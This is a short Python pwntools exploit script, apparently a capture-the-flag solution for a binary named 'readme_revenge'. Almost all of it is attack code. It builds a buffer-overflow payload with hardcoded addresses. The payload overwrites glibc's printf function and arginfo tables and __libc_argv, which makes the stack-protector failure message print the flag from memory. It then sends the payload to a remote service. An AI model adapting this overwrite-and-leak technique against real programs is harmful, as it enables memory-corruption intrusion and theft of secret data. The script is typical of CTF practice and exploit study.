from pwn import *

io = remote('0.0.0.0', 10001)		# io = process('./readme_revenge')

flag_addr = 0x6b4040
name_addr = 0x6b73e0
argv_addr = 0x6b7980
func_table = 0x6b7a28
arginfo_table = 0x6b7aa8
stack_chk_fail = 0x4359b0

payload  = p64(flag_addr)				# name
payload  = payload.ljust(0x73 * 8, "\x00")
payload += p64(stack_chk_fail)		# __printf_arginfo_table[spec->info.spec]
payload  = payload.ljust(argv_addr - name_addr, "\x00")
payload += p64(name_addr)				# __libc_argv
payload  = payload.ljust(func_table - name_addr, "\x00")
payload += p64(1)					# __printf_function_table
payload += p64(0)					# __printf_modifier_table
payload  = payload.ljust(arginfo_table - name_addr, "\x00")
payload += p64(name_addr)				# __printf_arginfo_table

# with open("./payload", "wb") as f:
#     f.write(payload)

io.sendline(payload)
print io.recvall()
